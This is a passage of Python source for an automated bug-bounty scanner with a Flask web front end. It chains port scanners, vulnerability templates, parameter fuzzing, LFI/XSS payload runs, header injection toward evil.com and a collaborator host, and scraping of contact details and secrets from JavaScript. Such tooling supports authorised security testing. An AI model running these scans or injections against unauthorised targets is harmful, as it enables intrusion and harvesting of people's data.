                    continue
    
    def network_comprehensive_scan(self):
        """Comprehensive network scanning - All methods from commands"""
        self.logger.info("Starting network scanning...")
        
        # Extract IPs from subdomains
        ips = []
        for subdomain in self.results['subdomains'][:20]:
            try:
                ip = socket.gethostbyname(subdomain)
                if ip not in ips:
                    ips.append(ip)
            except:
                continue
        
        # Save IPs to file
        with open(self.output_dir / "ips.txt", 'w') as f:
            for ip in ips:
                f.write(f"{ip}\n")
        
        # Method 1: Nmap comprehensive scan (from commands)
        nmap_cmd = f"nmap -p- --min-rate 1000 -T4 -A {self.target_domain} -oA fullscan"
        self.run_command(nmap_cmd, timeout=1800)
        
        # Method 2: Naabu scan (from commands)
        naabu_cmd = "naabu -list ips.txt -c 50 -nmap-cli 'nmap -sV -sC' -o naabu-full.txt"
        self.run_command(naabu_cmd, timeout=1200)
        
        # Method 3: Masscan (from commands)
        masscan_cmd = f"masscan -p0-65535 {self.target_domain} --rate 100000 -oG masscan-results.txt"
        self.run_command(masscan_cmd, timeout=600)
        
        # Method 4: Manual port scanning
        self.manual_port_scan(ips)
    
    def manual_port_scan(self, ips):
        """Manual port scanning for common ports"""
        common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389, 5432, 3306, 1433, 6379, 27017, 8080, 8443, 9200]
        open_ports = []
        
        def scan_port(ip, port):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                result = sock.connect_ex((ip, port))
                sock.close()
                if result == 0:
                    return f"{ip}:{port}"
            except:
                pass
            return None
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            for ip in ips:
                for port in common_ports:
                    futures.append(executor.submit(scan_port, ip, port))
            
            for future in as_completed(futures):
                result = future.result()
                if result:
                    open_ports.append(result)
        
        self.results['open_ports'] = open_ports
    
    def javascript_comprehensive_analysis(self):
        """Comprehensive JavaScript analysis - All methods from commands"""
        self.logger.info("Starting JavaScript analysis...")
        
        # Method 1: JS file hunting (from commands)
        js_hunt_cmd = f"echo {self.target_domain} | katana -d 5 | grep -E '\\.js$' | nuclei -t nuclei-templates/http/exposures/ -c 30"
        self.run_command(js_hunt_cmd)
        
        # Method 2: JS file analysis (from commands)
        js_analysis_cmd = "cat all_urls_final.txt | grep '\\.js$' | nuclei -t nuclei-templates/http/exposures/"
        self.run_command(js_analysis_cmd)
        
        # Method 3: Manual JavaScript analysis
        self.manual_js_analysis()
    
    def manual_js_analysis(self):
        """Manual JavaScript file analysis"""
        js_files = [url for url in self.results['urls'] if url.endswith('.js')]
        js_results = []
        
        for js_url in js_files[:15]:
            try:
                response = requests.get(js_url, timeout=15, verify=False)
                if response.status_code == 200:
                    content = response.text
                    
                    # Look for sensitive patterns
                    sensitive_patterns = {
                        'api_endpoints': r'["\']/(api/[^"\']+)["\']',
                        'passwords': r'password["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                        'tokens': r'token["\']?\s*[:=]\s*["\']([^"\']+)["\']',
                        'aws_keys': r'AKIA[0-9A-Z]{16}',
                        'private_keys': r'-----BEGIN PRIVATE KEY-----',
                        'database_urls': r'["\']([^"\']*(?:mysql|postgres|mongodb)[^"\']*)["\']'
                    }
                    
                    findings = {}
                    for pattern_name, pattern in sensitive_patterns.items():
                        matches = re.findall(pattern, content, re.IGNORECASE)
                        if matches:
                            findings[pattern_name] = matches
                    
                    if findings:
                        js_results.append({
                            'url': js_url,
                            'findings': findings,
                            'size': len(content),
                            'type': 'javascript_exposure'
                        })
            except:
                continue
        
        self.results['js_files'] = js_results
    
    def parameter_discovery_comprehensive(self):
        """Comprehensive parameter discovery - From commands"""
        self.logger.info("Starting parameter discovery...")
        
        # Method 1: Arjun passive (from commands)
        for url in [u for u in self.results['live_subdomains'] if any(ext in u for ext in ['.php', '.asp', '.jsp'])][:5]:
            arjun_passive_cmd = f"arjun -u {url} -oT arjun_passive.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers 'User-Agent: Mozilla/5.0'"
            self.run_command(arjun_passive_cmd)
            
            # Method 2: Arjun with wordlist (from commands)
            arjun_wordlist_cmd = f"arjun -u {url} -oT arjun_wordlist.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers 'User-Agent: Mozilla/5.0'"
            self.run_command(arjun_wordlist_cmd)
        
        # Method 3: Manual parameter fuzzing
        self.manual_parameter_discovery()
    
    def manual_parameter_discovery(self):
        """Manual parameter discovery"""
        common_params = [
            'id', 'page', 'file', 'path', 'url', 'redirect', 'return', 'next',
            'callback', 'jsonp', 'format', 'type', 'category', 'search', 'q',
            'query', 'keyword', 'name', 'email', 'username', 'password',
            'token', 'key', 'api_key', 'access_token', 'debug', 'test'
        ]
        
        discovered_params = []
        
        for url in self.results['live_subdomains'][:5]:
            for param in common_params:
                try:
                    test_url = f"{url}?{param}=test"
                    response = requests.get(test_url, timeout=10, verify=False)
                    
                    # Check if parameter affects response
                    normal_response = requests.get(url, timeout=10, verify=False)
                    
                    if response.text != normal_response.text or response.status_code != normal_response.status_code:
                        discovered_params.append({
                            'url': url,
                            'parameter': param,
                            'type': 'parameter_discovery',
                            'method': 'GET'
                        })
                except:
                    continue
        
        self.results['parameters'] = discovered_params
    
    def content_type_analysis(self):
        """Content type analysis - From commands"""
        self.logger.info("Analyzing content types...")
        
        # Method 1: Content type check (from commands)
        content_cmd = f"echo {self.target_domain} | gau | grep -Eo '(\\/[^\\/]+)\\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html) | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'"
        self.run_command(content_cmd)
        
        # Method 2: JavaScript content check (from commands)
        js_content_cmd = f"echo {self.target_domain} | gau | grep '\\.js | httpx -status-code -mc 200 -content-type | grep 'application/javascript'"
        self.run_command(js_content_cmd)
        
        # Method 3: Manual content type verification
        self.manual_content_type_check()
    
    def manual_content_type_check(self):
        """Manual content type verification"""
        content_types = {}
        
        for url in self.results['urls'][:100]:
            try:
                response = requests.head(url, timeout=5, verify=False)
                if response.status_code == 200:
                    content_type = response.headers.get('content-type', 'unknown')
                    if content_type not in content_types:
                        content_types[content_type] = []
                    content_types[content_type].append(url)
            except:
                continue
        
        # Save content type analysis
        with open(self.output_dir / "content_types.json", 'w') as f:
            json.dump(content_types, f, indent=2)
    
    def shodan_reconnaissance(self):
        """Shodan reconnaissance - From commands"""
        self.logger.info("Performing Shodan reconnaissance...")
        
        # Shodan dork (from commands): Ssl.cert.subject.CN:"example.com" 200
        shodan_cmd = f'shodan search "ssl.cert.subject.cn:{self.target_domain}" --fields ip_str,port,org,os'
        stdout, stderr, code = self.run_command(shodan_cmd)
        
        shodan_results = []
        if stdout:
            for line in stdout.split('\n'):
                if line.strip():
                    parts = line.split('\t')
                    if len(parts) >= 2:
                        shodan_results.append({
                            'ip': parts[0],
                            'port': parts[1] if len(parts) > 1 else 'unknown',
                            'org': parts[2] if len(parts) > 2 else 'unknown',
                            'os': parts[3] if len(parts) > 3 else 'unknown'
                        })
        
        self.results['shodan_data'] = shodan_results
    
    def advanced_header_testing(self):
        """Advanced XSS/SSRF header testing - From commands"""
        self.logger.info("Testing headers for XSS/SSRF...")
        
        # Method 1: XSS and SSRF testing with headers (from commands)
        header_test_cmd = f"cat live_subdomains_final.txt | assetfinder --subs-only | httprobe | while read url; do curl -s -L $url -H 'X-Forwarded-For: xss.burpcollaborator.net' -H 'X-Forwarded-Host: xss.burpcollaborator.net' -H 'Host: xss.burpcollaborator.net'; done"
        self.run_command(header_test_cmd)
        
        # Method 2: Manual header injection testing
        self.manual_header_injection_testing()
    
    def manual_header_injection_testing(self):
        """Manual header injection testing"""
        test_headers = {
            'X-Forwarded-For': 'evil.com',
            'X-Forwarded-Host': 'evil.com',
            'X-Originating-IP': '127.0.0.1',
            'X-Remote-IP': '127.0.0.1',
            'X-Remote-Addr': '127.0.0.1',
            'X-Real-IP': 'evil.com',
            'Host': 'evil.com'
        }
        
        header_vulnerabilities = []
        
        for url in self.results['live_subdomains'][:5]:
            for header, value in test_headers.items():
                try:
                    response = requests.get(url, headers={header: value}, timeout=10, verify=False)
                    if value in response.text:
                        header_vulnerabilities.append({
                            'url': url,
                            'header': header,
                            'payload': value,
                            'type': 'header_injection',
                            'risk': 'Medium'
                        })
                except:
                    continue
        
        self.results['header_vulnerabilities'] = header_vulnerabilities
    
    def technology_stack_detection(self):
        """Detect technology stack"""
        self.logger.info("Detecting technology stack...")
        
        technologies = []
        
        for url in self.results['live_subdomains'][:10]:
            try:
                response = requests.get(url, timeout=10, verify=False)
                headers = response.headers
                content = response.text[:5000]  # First 5KB
                
                tech_info = {
                    'url': url,
                    'server': headers.get('server', 'unknown'),
                    'x_powered_by': headers.get('x-powered-by', 'unknown'),
                    'technologies': []
                }
                
                # Detect technologies from headers and content
                tech_indicators = {
                    'WordPress': ['wp-content', 'wp-includes', 'wordpress'],
                    'Drupal': ['drupal', 'sites/default'],
                    'Joomla': ['joomla', 'administrator/index.php'],
                    'Laravel': ['laravel_session', 'laravel'],
                    'Django': ['django', 'csrfmiddlewaretoken'],
                    'React': ['react', 'react-dom'],
                    'Angular': ['angular', 'ng-'],
                    'Vue.js': ['vue.js', '__vue__'],
                    'Bootstrap': ['bootstrap', 'btn-'],
                    'jQuery': 'jquery',
                    'PHP': ['<?php', 'PHPSESSID'],
                    'ASP.NET': ['viewstate', '__VIEWSTATE'],
                    'Java': ['jsessionid', 'java'],
                    'Python': ['django', 'flask'],
                    'Apache': ['apache'],
                    'Nginx': ['nginx'],
                    'IIS': ['iis', 'aspnet']
                }
                
                content_lower = content.lower()
                for tech, indicators in tech_indicators.items():
                    if any(indicator in content_lower or indicator in headers.get('server', '').lower() 
                          for indicator in indicators):
                        tech_info['technologies'].append(tech)
                
                technologies.append(tech_info)
                
            except:
                continue
        
        self.results['technology_stack'] = technologies
    
    def dns_comprehensive_analysis(self):
        """Comprehensive DNS analysis"""
        self.logger.info("Performing DNS analysis...")
        
        dns_records = []
        record_types = ['A', 'AAAA', 'CNAME', 'MX', 'NS', 'TXT', 'SOA']
        
        for record_type in record_types:
            try:
                answers = dns.resolver.resolve(self.target_domain, record_type)
                for rdata in answers:
                    dns_records.append({
                        'type': record_type,
                        'value': str(rdata),
                        'ttl': answers.ttl
                    })
            except:
                continue
        
        self.results['dns_records'] = dns_records
    
    def ssl_certificate_analysis(self):
        """SSL certificate analysis"""
        self.logger.info("Analyzing SSL certificates...")
        
        ssl_info = []
        
        for url in self.results['live_subdomains']:
            if url.startswith('https://'):
                try:
                    import ssl
                    hostname = urlparse(url).netloc
                    context = ssl.create_default_context()
                    
                    with socket.create_connection((hostname, 443), timeout=10) as sock:
                        with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                            cert = ssock.getpeercert()
                            
                            ssl_info.append({
                                'url': url,
                                'subject': dict(x[0] for x in cert['subject']),
                                'issuer': dict(x[0] for x in cert['issuer']),
                                'version': cert['version'],
                                'not_before': cert['notBefore'],
                                'not_after': cert['notAfter'],
                                'san': cert.get('subjectAltName', [])
                            })
                except:
                    continue
        
        self.results['ssl_info'] = ssl_info
    
    def email_phone_extraction(self):
        """Extract emails and phone numbers"""
        self.logger.info("Extracting contact information...")
        
        emails = set()
        phones = set()
        
        for url in self.results['live_subdomains'][:10]:
            try:
                response = requests.get(url, timeout=10, verify=False)
                if response.status_code == 200:
                    content = response.text
                    
                    # Extract emails
                    email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b'
                    found_emails = re.findall(email_pattern, content)
                    emails.update(found_emails)
                    
                    # Extract phone numbers
                    phone_patterns = [
                        r'\+?1?[-.\s]?\(?[0-9]{3}\)?[-.\s]?[0-9]{3}[-.\s]?[0-9]{4}',
                        r'\+?[0-9]{1,3}[-.\s]?[0-9]{3,4}[-.\s]?[0-9]{3,4}[-.\s]?[0-9]{3,4}'
                    ]
                    
                    for pattern in phone_patterns:
                        found_phones = re.findall(pattern, content)
                        phones.update(found_phones)
            except:
                continue
        
        self.results['email_addresses'] = list(emails)
        self.results['phone_numbers'] = list(phones)
    
    def social_media_discovery(self):
        """Discover social media profiles"""
        self.logger.info("Discovering social media profiles...")
        
        social_platforms = {
            'twitter': f'https://twitter.com/{self.target_domain.split(".")[0]}',
            'facebook': f'https://facebook.com/{self.target_domain.split(".")[0]}',
            'linkedin': f'https://linkedin.com/company/{self.target_domain.split(".")[0]}',
            'instagram': f'https://instagram.com/{self.target_domain.split(".")[0]}',
            'github': f'https://github.com/{self.target_domain.split(".")[0]}'
        }
        
        social_profiles = []
        
        for platform, url in social_platforms.items():
            try:
                response = requests.get(url, timeout=10, verify=False)
                if response.status_code == 200:
                    social_profiles.append({
                        'platform': platform,
                        'url': url,
                        'status': 'found'
                    })
            except:
                continue
        
        self.results['social_media'] = social_profiles
    
    def ffuf_advanced_testing(self):
        """Advanced FFUF testing - From commands"""
        self.logger.info("Running advanced FFUF tests...")
        
        # Method 1: FFUF request file method for LFI (from commands)
        ffuf_lfi_cmd = "ffuf -request lfi -request-proto https -w /root/wordlists/offensive\\ payloads/LFI\\ payload.txt -c -mr 'root:'"
        self.run_command(ffuf_lfi_cmd)
        
        # Method 2: FFUF request file method for XSS (from commands)
        ffuf_xss_cmd = "ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr '<script>alert(\\'XSS\\')</script>'"
        self.run_command(ffuf_xss_cmd)
        
        # Create request files for FFUF
        self.create_ffuf_request_files()
    
    def create_ffuf_request_files(self):
        """Create FFUF request files"""
        # LFI request file
        lfi_request = f"""GET /page.php?file=FUZZ HTTP/1.1
Host: {self.target_domain}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close

"""
        
        with open(self.output_dir / "lfi_request.txt", 'w') as f:
            f.write(lfi_request)
        
        # XSS request file
        xss_request = f"""GET /search.php?q=FUZZ HTTP/1.1
Host: {self.target_domain}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close

"""
        
        with open(self.output_dir / "xss_request.txt", 'w') as f:
            f.write(xss_request)
    
    def information_disclosure_comprehensive(self):
        """Comprehensive information disclosure testing"""
        self.logger.info("Testing for information disclosure...")
        
        # Google dorking (from commands)
        google_dork = f"site:*.{self.target_domain} (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)"
        
        # Save dork for manual use
        with open(self.output_dir / "google_dorks.txt", 'w') as f:
            f.write(f"Google Dork: {google_dork}\n")
            f.write(f"Shodan Dork: Ssl.cert.subject.CN:'{self.target_domain}' 200\n")
        
        self.logger.info("Information disclosure dorks saved to google_dorks.txt")
    
    def generate_comprehensive_report(self):
        """Generate comprehensive final report"""
        self.logger.info("Generating comprehensive report...")
        self.results['status'] = 'completed'
        self.results['completion_time'] = datetime.now().isoformat()
        
        # Calculate statistics
        stats = {
            'total_subdomains': len(self.results['subdomains']),
            'live_subdomains': len(self.results['live_subdomains']),
            'total_urls': len(self.results['urls']),
            'sensitive_files': len(self.results['sensitive_files']),
            'vulnerabilities_found': (
                len(self.results['xss_vulnerabilities']) +
                len(self.results['sql_injection']) +
                len(self.results['lfi_vulnerabilities']) +
                len(self.results['cors_issues']) +
                len(self.results['subdomain_takeover'])
            ),
            'api_keys_found': len(self.results['api_keys']),
            'open_ports': len(self.results['open_ports'])
        }
        
        self.results['statistics'] = stats
        
        # Save comprehensive JSON report
        with open(self.output_dir / "comprehensive_report.json", 'w') as f:
            json.dump(self.results, f, indent=2, default=str)
        
        # Generate text summary
        self.generate_text_summary(stats)
        
        self.logger.info("Comprehensive scan completed!")
        return self.results
    
    def generate_text_summary(self, stats):
        """Generate human-readable text summary"""
        summary = f"""
=== ADVANCED BUG BOUNTY SCAN REPORT ===
Target: {self.target_domain}
Scan Date: {self.results['timestamp']}
Completion: {self.results['completion_time']}

=== STATISTICS ===
Total Subdomains Found: {stats['total_subdomains']}
Live Subdomains: {stats['live_subdomains']}
URLs Collected: {stats['total_urls']}
Sensitive Files: {stats['sensitive_files']}
Total Vulnerabilities: {stats['vulnerabilities_found']}
API Keys Exposed: {stats['api_keys_found']}
Open Ports: {stats['open_ports']}

=== CRITICAL FINDINGS ===
"""
        
        # Add critical findings
        if self.results['subdomain_takeover']:
            summary += f"\n🚨 SUBDOMAIN TAKEOVER: {len(self.results['subdomain_takeover'])} potential takeovers found"
        
        if self.results['api_keys']:
            summary += f"\n🔑 API KEYS EXPOSED: {len(self.results['api_keys'])} keys found in JavaScript files"
        
        if self.results['sql_injection']:
            summary += f"\n💉 SQL INJECTION: {len(self.results['sql_injection'])} potential SQLi vulnerabilities"
        
        if self.results['xss_vulnerabilities']:
            summary += f"\n🔍 XSS VULNERABILITIES: {len(self.results['xss_vulnerabilities'])} XSS issues found"
        
        if self.results['lfi_vulnerabilities']:
            summary += f"\n📁 LFI VULNERABILITIES: {len(self.results['lfi_vulnerabilities'])} LFI issues found"
        
        if self.results['cors_issues']:
            summary += f"\n🌐 CORS ISSUES: {len(self.results['cors_issues'])} CORS misconfigurations"
        
        if self.results['sensitive_files']:
            summary += f"\n📄 SENSITIVE FILES: {len(self.results['sensitive_files'])} sensitive files exposed"
        
        summary += f"""

=== FILES GENERATED ===
- comprehensive_report.json (Complete JSON results)
- all_subdomains.txt (All discovered subdomains)
- live_subdomains_final.txt (Live subdomains)
- all_urls_final.txt (All collected URLs)
- scan.log (Detailed scan log)
- Various tool-specific output files

=== RECOMMENDATIONS ===
1. Review all critical and high-risk findings immediately
2. Implement proper input validation and output encoding
3. Configure CORS policies correctly
4. Remove or secure sensitive file exposures
5. Update vulnerable software components
6. Implement proper authentication and authorization
7. Regular security testing and monitoring

Scan completed successfully with {stats['vulnerabilities_found']} total vulnerabilities identified.
"""
        
        with open(self.output_dir / "scan_summary.txt", 'w') as f:
            f.write(summary)
        
        print(summary)
    
    def run_full_scan(self):
        """Run complete comprehensive scan with all 74+ commands"""
        try:
            self.logger.info(f"Starting comprehensive bug bounty scan for {self.target_domain}")
            
            # Phase 1: Subdomain Discovery
            self.subdomain_enumeration_advanced()
            
            # Phase 2: Live Filtering
            self.filter_live_subdomains_advanced()
            
            # Phase 3: URL Collection
            self.comprehensive_url_collection()
            
            # Phase 4: Sensitive Files
            self.comprehensive_sensitive_file_detection()
            
            # Phase 5: Vulnerability Scanning
            self.comprehensive_vulnerability_scanning()
            
            # Phase 6: Parameter Discovery
            self.parameter_discovery_comprehensive()
            
            # Phase 7: Content Analysis
            self.content_type_analysis()
            
            # Phase 8: Shodan Reconnaissance
            self.shodan_reconnaissance()
            
            # Phase 9: Header Testing
            self.advanced_header_testing()
            
            # Phase 10: Technology Detection
            self.technology_stack_detection()
            
            # Phase 11: DNS Analysis
            self.dns_comprehensive_analysis()
            
            # Phase 12: SSL Analysis
            self.ssl_certificate_analysis()
            
            # Phase 13: Contact Information
            self.email_phone_extraction()
            
            # Phase 14: Social Media
            self.social_media_discovery()
            
            # Phase 15: Advanced FFUF
            self.ffuf_advanced_testing()
            
            # Phase 16: Information Disclosure
            self.information_disclosure_comprehensive()
            
            # Final Report Generation
            return self.generate_comprehensive_report()
            
        except KeyboardInterrupt:
            self.logger.warning("Scan interrupted by user")
            self.results['status'] = 'interrupted'
            return self.results
        except Exception as e:
            self.logger.error(f"Scan failed: {str(e)}")
            self.results['status'] = 'failed'
            self.results['error'] = str(e)
            return self.results


class WebInterface:
    """Web interface for the bug bounty tool"""
    
    def __init__(self):
        self.app = Flask(__name__)
        CORS(self.app)
        self.setup_routes()
        self.active_scans = {}
    
    def setup_routes(self):
        """Setup Flask routes"""
        
        @self.app.route('/')
        def index():
            return render_template('index.html')
        
        @self.app.route('/api/scan', methods=['POST'])
        def start_scan():
            data = request.get_json()
            domain = data.get('domain', '').strip()
            
            if not domain:
                return jsonify({'error': 'Domain is required'}), 400
            
            # Validate domain
            if not self.validate_domain(domain):
                return jsonify({'error': 'Invalid domain format'}), 400
            
            # Create scan instance
            scan_id = hashlib.md5(f"{domain}{time.time()}".encode()).hexdigest()[:8]
            
            # Start scan in background thread
            scanner = AdvancedBugBountyTool(domain, f"results/{scan_id}")
            
            def run_scan():
                self.active_scans[scan_id] = scanner.run_full_scan()
            
            thread = threading.Thread(target=run_scan)
            thread.daemon = True
            thread.start()
            
            return jsonify({
                'scan_id': scan_id,
                'status': 'started',
                'message': f'Scan started for {domain}'
            })
        
        @self.app.route('/api/scan/<scan_id>/status', methods=['GET'])
        def scan_status(scan_id):
            if scan_id not in self.active_scans:
                return jsonify({'error': 'Scan not found'}), 404
            
            results = self.active_scans[scan_id]
            return jsonify({
                'scan_id': scan_id,
                'status': results.get('status', 'unknown'),
                'statistics': results.get('statistics', {}),
                'progress': self.calculate_progress(results)
            })
        
        @self.app.route('/api/scan/<scan_id>/results', methods=['GET'])
        def scan_results(scan_id):
            if scan_id not in self.active_scans:
                return jsonify({'error': 'Scan not found'}), 404
            
            return jsonify(self.active_scans[scan_id])
        
        @self.app.route('/api/scan/<scan_id>/download', methods=['GET'])
        def download_results(scan_id):
            if scan_id not in self.active_scans:
                return jsonify({'error': 'Scan not found'}), 404
            
            results_file = Path(f"results/{scan_id}") / "comprehensive_report.json"
            if results_file.exists():
                return send_file(str(results_file), as_attachment=True)
            else:
                return jsonify({'error': 'Results file not found'}), 404
        
        @self.app.route('/api/scans', methods=['GET'])
        def list_scans():
            return jsonify({
                'active_scans': len(self.active_scans),
                'scans': [
                    {
                        'scan_id': scan_id,
                        'target': results.get('target', 'unknown'),
                        'status': results.get('status', 'unknown'),
                        'timestamp': results.get('timestamp', 'unknown')
                    }
                    for scan_id, results in self.active_scans.items()
                ]
            })
    
    def validate_domain(self, domain):
        """Validate domain format"""
        domain_pattern = r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$'
        return re.match(domain_pattern, domain.replace('http://', '').replace('https://', ''))
    
    def calculate_progress(self, results):
        """Calculate scan progress percentage"""
        phases = [
            'subdomain_enum', 'live_filtering', 'url_collection', 'sensitive_files',
            'vulnerability_scan', 'completed'
        ]
        
        current_phase = results.get('status', 'initialized')
        if current_phase in phases:
            return (phases.index(current_phase) + 1) * 20
        elif current_phase == 'completed':
            return 100
        else:
            return 10
    
    def run(self, host='0.0.0.0', port=5000, debug=False):
        """Run the web interface"""
        self.app.run(host=host, port=port, debug=debug, threaded=True)


def create_html_template():
    """Create the HTML template for web interface"""
    html_template = """<!DOCTYPE html>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Bug Bounty Scanner</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.js"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;     
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f0f23 0%, #1a1a3e 50%, #0f0f23 100%);
            color: #e0e0e0;
            min-height: 100vh;
            overflow-x: hidden;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }

        .header {
            text-align: center;
            margin-bottom: 40px;
            padding: 30px;
            background: rgba(255, 255, 255, 0.05);
            border-radius: 20px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }

        .header h1 {
            font-size: 3.5rem;
            background: linear-gradient(45deg, #00ff88, #00ccff, #ff0080);
            background-clip: text;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 10px;
            text-shadow: 0 0 30px rgba(0, 255, 136, 0.5);
            animation: glow 2s ease-in-out infinite alternate;
        }

        @keyframes glow {
            from { filter: brightness(1) drop-shadow(0 0 5px rgba(0, 255, 136, 0.5)); }
            to { filter: brightness(1.2) drop-shadow(0 0 20px rgba(0, 255, 136, 0.8)); }
        }

        .header p {
            font-size: 1.2rem;
            opacity: 0.8;
            margin-bottom: 20px;
        }

        .scan-controls {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 30px;
            margin-bottom: 30px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .input-group {
            margin-bottom: 25px;
        }

        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #00ff88;
        }

        .target-input {
            width: 100%;
            padding: 15px 20px;
            border: 2px solid rgba(0, 255, 136, 0.3);
            border-radius: 10px;
            background: rgba(255, 255, 255, 0.05);
            color: #fff;
            font-size: 1.1rem;
            transition: all 0.3s ease;
        }

        .target-input:focus {
            outline: none;
            border-color: #00ff88;
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
            background: rgba(255, 255, 255, 0.1);
        }

        .scan-types {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 15px;
            margin-bottom: 25px;
        }

        .scan-type {
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            padding: 20px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .scan-type:hover {
            transform: translateY(-5px);
            border-color: rgba(0, 255, 136, 0.5);
            background: rgba(0, 255, 136, 0.1);
        }

        .scan-type.selected {
            border-color: #00ff88;
            background: rgba(0, 255, 136, 0.15);
            box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
        }

        .scan-type input {
            display: none;
        }

        .scan-type-icon {
            font-size: 2rem;
            margin-bottom: 10px;
            color: #00ff88;
        }

        .scan-type h3 {
            margin-bottom: 8px;
            color: #fff;
        }

        .scan-type p {
            opacity: 0.7;
            font-size: 0.9rem;
        }

        .control-buttons {
            display: flex;
            gap: 15px;
            justify-content: center;
            flex-wrap: wrap;
        }

        .btn {
            padding: 15px 30px;
            border: none;
            border-radius: 10px;
            font-size: 1.1rem;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
        }

        .btn:before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s;
        }

        .btn:hover:before {
            left: 100%;
        }

        .btn-primary {
            background: linear-gradient(45deg, #00ff88, #00ccff);
            color: #000;
            box-shadow: 0 4px 15px rgba(0, 255, 136, 0.3);
        }

        .btn-primary:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(0, 255, 136, 0.5);
        }

        .btn-danger {
            background: linear-gradient(45deg, #ff4757, #ff6b7d);
            color: #fff;
            box-shadow: 0 4px 15px rgba(255, 71, 87, 0.3);
        }

        .btn-danger:hover {
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(255, 71, 87, 0.5);
        }

        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
        }

        .scan-output {
            background: rgba(0, 0, 0, 0.4);
            border-radius: 15px;
            border: 1px solid rgba(0, 255, 136, 0.3);
            margin-top: 30px;
            overflow: hidden;
        }

        .output-header {
            background: linear-gradient(90deg, rgba(0, 255, 136, 0.2), rgba(0, 204, 255, 0.2));
            padding: 15px 25px;
            border-bottom: 1px solid rgba(0, 255, 136, 0.3);
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .output-title {
            font-weight: 600;
            color: #00ff88;
        }

        .scan-info {
            display: flex;
            gap: 20px;
            font-size: 0.9rem;
            opacity: 0.8;
        }

        .output-content {
            height: 500px;
            overflow-y: auto;
            padding: 20px;
            font-family: 'Courier New', monospace;
            font-size: 0.95rem;
            line-height: 1.4;
        }

        .log-entry {
            margin-bottom: 8px;
            padding: 8px 12px;
            border-radius: 6px;
            border-left: 4px solid;
            animation: slideIn 0.3s ease-out;
        }

        @keyframes slideIn {
            from { opacity: 0; transform: translateX(-20px); }
            to { opacity: 1; transform: translateX(0); }
        }

        .log-info {
            border-left-color: #00ccff;
            background: rgba(0, 204, 255, 0.1);
        }

        .log-success {
            border-left-color: #00ff88;
            background: rgba(0, 255, 136, 0.1);
        }

        .log-warning {
            border-left-color: #ffcc00;
            background: rgba(255, 204, 0, 0.1);
        }

        .log-error {
            border-left-color: #ff4757;
            background: rgba(255, 71, 87, 0.1);
        }

        .log-output {
            border-left-color: #a55eea;
            background: rgba(165, 94, 234, 0.1);
            font-family: 'Courier New', monospace;
            font-size: 0.85rem;
        }

        .timestamp {
            color: #888;
            font-size: 0.8rem;
            margin-right: 10px;
        }

        .results-summary {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 25px;
            margin-top: 20px;
            border: 1px solid rgba(0, 255, 136, 0.3);
        }

        .summary-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
